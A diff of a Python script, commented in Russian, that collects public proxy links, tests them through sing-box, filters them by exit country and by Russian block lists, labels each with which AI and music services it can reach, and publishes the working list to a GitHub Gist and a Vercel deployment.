+    if net == 'ws':
+        transport = {"type": "ws", "path": data.get('path', '/')}
+        if data.get('host') or data.get('sni'): transport["headers"] = {"Host": data.get('host') or data.get('sni')}
+    elif net == 'grpc':
+        transport = {"type": "grpc", "service_name": data.get('serviceName', '')}
+    
+    if transport and data['protocol'] in ['vmess', 'vless', 'trojan']:
+        outbound["transport"] = transport
+
+    config["outbounds"].append(outbound)
+    return json.dumps(config)
+
+def rebuild_link(original_link, data, new_name):
+    # Простая логика пересборки, сохраняем оригинальную схему, меняем только имя (#)
+    # Для VMess нужен JSON, для остального URL params
+    if original_link.startswith('vmess://'):
+        try:
+            b64 = original_link[8:]
+            conf = json.loads(safe_base64_decode(b64).decode('utf-8'))
+            conf['ps'] = new_name
+            new_b64 = base64.b64encode(json.dumps(conf).encode('utf-8')).decode('utf-8')
+            return f"vmess://{new_b64}"
+        except: pass
+    base = original_link.split('#')[0]
+    return f"{base}#{urllib.parse.quote(new_name)}"
+
+def get_ip_info(ip, cache, is_exit=False):
+    """Определяет страну и ISP для IP с fallback API."""
+    if ip in cache:
+        return cache[ip]
+    
+    info = {'country': '', 'org': ''}
+    try:
+        # Пробуем основной API
+        r = requests.get(f"http://ipinfo.io/{ip}/json", timeout=5)
+        r.raise_for_status()
+        d = r.json()
+        info['country'] = d.get('country', '')
+        info['org'] = d.get('org', '')
+    except:
+        try:
+            # Fallback API
+            r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,isp", timeout=5)
+            r.raise_for_status()
+            d = r.json()
+            info['country'] = d.get('country', '')
+            info['org'] = d.get('isp', '') # ip-api uses 'isp' field
+        except:
+            pass
+    
+    cache[ip] = info
+    return info
+
+seen_proxies = set()
+error_counter = 0
+entry_ip_country_cache = {}
+
+def check_proxy(link):
+    global error_counter
+    proc = None
+    config_filename = None
+    try:
+        data = parse_proxy_link(link)
+        if not data or data.get('protocol') in ['shadowsocks', 'ss']:
+            return None
+
+        server_address = data.get('server')
+        entry_ip = None
+
+        if server_address and not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', server_address):
+            try: entry_ip = socket.gethostbyname(server_address)
+            except: return None
+        else:
+            entry_ip = server_address
+        
+        if not entry_ip or is_ip_banned(entry_ip): return None
+        
+        # --- Смягчение фильтра протоколов ---
+        prot = data.get('protocol')
+        # Разрешаем hysteria2 и tuic без ограничений по транспорту
+        if prot in ['hysteria2', 'tuic']:
+            pass # Skip transport checks
+        else:
+            net = data.get('network', 'tcp')
+            sec = data.get('security', ''); flow = data.get('flow', '')
+            # Старый фильтр для vmess/vless/trojan
+            if not ( (sec == 'reality' and 'vision' in flow) or (net == 'ws') or (net == 'grpc') or (prot == 'trojan') or (sec == 'tls') or (data.get('tls') == 'tls') ):
+                return None
+        
+        identifier = f"{data.get('server')}:{data.get('port')}"
+        if identifier in seen_proxies: return None
+        seen_proxies.add(identifier)
+
+        local_port = get_free_port()
+        conf_str = generate_singbox_config(data, local_port)
+        
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as config_file:
+            config_file.write(conf_str)
+            config_filename = config_file.name
+
+        proc = subprocess.Popen([SING_BOX_PATH, "run", "-c", config_filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1.5)
+        if proc.poll() is not None: return None
+
+        proxies = {'http': f'socks5://127.0.0.1:{local_port}', 'https': f'socks5://127.0.0.1:{local_port}'}
+
+        st = time.time()
+        requests.get(TEST_URL, proxies=proxies, timeout=TIMEOUT)
+        ping = int((time.time() - st) * 1000)
+
+        api_data = {}
+        # Получение информации о выходном IP (с fallback)
+        for _ in range(API_RETRIES):
+            try:
+                # Пробуем ipinfo.io
+                r = requests.get(IP_API_URL, proxies=proxies, timeout=TIMEOUT)
+                if r.status_code == 200 and 'ip' in r.json():
+                    api_data = r.json()
+                    break
+            except: 
+                pass
+        
+        # Если ipinfo не ответил, пробуем ip-api.com (определяет выходной IP через заголовки или просто свой IP)
+        if not api_data:
+            try:
+                r = requests.get(IP_API_FALLBACK_URL, proxies=proxies, timeout=TIMEOUT)
+                if r.status_code == 200:
+                    d = r.json()
+                    # Адаптация полей ip-api под ipinfo формат
+                    api_data = {
+                        'ip': d.get('query'),
+                        'country': d.get('countryCode'),
+                        'city': d.get('city'),
+                        'org': d.get('isp')
+                    }
+            except:
+                pass
+
+        if not api_data: return None
+        
+        exit_ip = api_data.get('ip')
+        exit_country = api_data.get('country', 'XX')
+        
+        # --- Смягчение фильтра стран выхода ---
+        BANNED_EXIT_COUNTRIES = {'RU', 'HK', 'CN'} # Убрали XX
+        if exit_country in BANNED_EXIT_COUNTRIES: return None
+        # Если страна неизвестна (XX), оставляем, но Cheburcheck потом может заблокировать
+
+        # --- Определение Anti-Whitelist с Fallback ---
+        is_russian_entry = False
+        entry_country = ''
+        
+        # Используем функцию с fallback
+        entry_info = get_ip_info(entry_ip, entry_ip_country_cache)
+        entry_country = entry_info.get('country', '')
+
+        if entry_country == 'RU' and exit_country != 'RU':
+            is_russian_entry = True
+            print(f"[Info] Russian entry {entry_ip} -> Foreign exit {exit_ip}. Bypassing Cheburcheck.")
+            
+        # --- Cheburcheck Logic ---
+        if not is_russian_entry:
+            if cheburcheck_is_blocked(exit_ip): return None
+            sni = data.get('sni')
+            if sni and sni != exit_ip and not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', sni):
+                if cheburcheck_is_blocked(sni): return None
+
+        isp = api_data.get('org', 'Unknown')
+        isp_clean = re.sub(r'^AS\d+\s+', '', isp)
+        if re.search(BANNED_ISP_REGEX, isp_clean): return None
+        
+        gpt_ok = False
+        try:
+            gpt_r = requests.get(OPENAI_URL, proxies=proxies, timeout=5)
+            if gpt_r.status_code in [200, 401]: gpt_ok = True
+        except: pass
+        
+        flag = country_flag(exit_country)
+        city = api_data.get('city', 'Unknown')
+        gemini_ico = '✅' if exit_country in GEMINI_ALLOWED else '❌'
+        yt_ico = '✅' if exit_country in YT_MUSIC_ALLOWED else '❌'
+        gpt_ico = '✅' if gpt_ok else '❌'
+        
+        # Добавляем метки протоколов
+        proto_tag = ""
+        if prot == 'hysteria2': proto_tag = "[HY2] "
+        elif prot == 'tuic': proto_tag = "[TUIC] "
+        
+        base_name = f"{proto_tag}{flag} {exit_country} - {city} ◈ {isp_clean} | 🎵YT_Music{yt_ico} ✨Gemini{gemini_ico} 🤖ChatGPT{gpt_ico}"
+        name = f"⚠️ Anti-Whitelist 🇷🇺 RU -> {base_name}" if is_russian_entry else base_name
+
+        new_link = rebuild_link(link, data, name)
+        link_hash = hashlib.md5(new_link.encode('utf-8')).hexdigest()
+        
+        return (ping, new_link, link_hash)
+
+    except Exception as e:
+        if error_counter < 5: 
+            error_counter += 1
+            # print(f"Error checking proxy: {e}") # Debug
+        return None
+    finally:
+        if proc: 
+            try: proc.terminate(); proc.wait(timeout=1)
+            except: proc.kill()
+        if config_filename and os.path.exists(config_filename):
+            try: os.remove(config_filename)
+            except: pass
+
+def deploy(links_content, pings_content):
+    if not all([GH_TOKEN, GIST_ID, VERCEL_TOKEN, PROJ_ID]):
+        print("Secrets missing.")
+        return
+
+    print("Updating Gist...")
+    try:
+        payload = {
+            'files': {
+                GIST_FILENAME: {'content': links_content},
+                PING_FILENAME: {'content': pings_content}
+            },
+            'description': f'SingBox Updated: {time.strftime("%Y-%m-%d %H:%M UTC")}'
+        }
+        r = requests.patch(f'https://api.github.com/gists/{GIST_ID}', headers={'Authorization': f'token {GH_TOKEN}'}, json=payload)
+        r.raise_for_status()
+        raw_url = r.json()['files'][GIST_FILENAME]['raw_url']
+        final_url = f"{raw_url}?t={int(time.time())}"
+        print("Gist OK.")
+    except Exception as e: print(f"Gist Error: {e}"); return
+
+    print("Triggering Vercel...")
+    h = {"Authorization": f"Bearer {VERCEL_TOKEN}"}
+    try:
+        envs = requests.get(f"https://api.vercel.com/v9/projects/{PROJ_ID}/env", headers=h).json().get('envs', [])
+        eid = next((e['id'] for e in envs if e['key'] == ENV_KEY), None)
+        body = {"value": final_url, "target": ["production"], "type": "plain"}
+
+        if eid: requests.patch(f"https://api.vercel.com/v9/projects/{PROJ_ID}/env/{eid}", headers=h, json=body)
+        else: body['key'] = ENV_KEY; requests.post(f"https://api.vercel.com/v10/projects/{PROJ_ID}/env", headers=h, json=body)
+
+        proj = requests.get(f"https://api.vercel.com/v9/projects/{PROJ_ID}", headers=h).json()
+        payload = {"name": proj.get('name'), "project": PROJ_ID, "target": "production"}
+
+        if 'link' in proj and 'repoId' in proj['link']:
+            payload['gitSource'] = {"type": "github", "ref": "main", "repoId": proj['link']['repoId']}
+
+        requests.post("https://api.vercel.com/v13/deployments", headers=h, json=payload)
+        print("Vercel OK.")
+    except Exception as e: print(f"Vercel Error: {e}")
+
+def main():
+    if not os.path.exists(SING_BOX_PATH):
+        print("Sing-box not found!")
+        sys.exit(1)
+    
+    load_rkn_lists()
+
+    all_raw = scrape_all_sources()
+    if not all_raw: return
+
+    results = []
+    seen_proxies.clear()
+    
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS_CHECK) as exe:
+        futures = {exe.submit(check_proxy, l): l for l in all_raw}
+        for f in tqdm(as_completed(futures), total=len(all_raw), desc="Checking"):
+            res = f.result()
+            if res: results.append(res)
+    
+    print(f"\nWorking: {len(results)}")
+    
+    if results:
+        results.sort(key=lambda x: x[0])
+        links_str = "\n".join([r[1] for r in results])
+        pings_map = {r[2]: r[0] for r in results}
+        pings_json = json.dumps(pings_map)
+        deploy(links_str, pings_json)
+    else:
+        print("No working proxies.")
+
+if __name__ == "__main__":
+    main()
